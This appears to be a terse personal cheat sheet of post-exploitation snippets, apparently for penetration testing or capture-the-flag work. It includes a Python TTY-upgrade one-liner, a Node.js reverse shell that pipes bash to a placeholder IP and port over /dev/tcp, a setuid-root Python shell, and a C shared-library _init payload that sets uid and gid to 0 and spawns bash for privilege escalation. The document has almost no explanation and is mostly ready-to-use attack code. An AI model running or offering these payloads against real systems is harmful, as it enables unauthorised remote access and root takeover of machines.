python3 -c "import pty;pty.spawn('/bin/bash')"

bash -p

CHECK GTFO BINS

REVERSE SHELL: 
Node.js
```shell
require('child_process').execSync('bash -c "bash -i >& /dev/tcp/IP/Port 0>&1"')
```

```bash
python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0); setgid(0);
    system("/bin/bash");
}

```
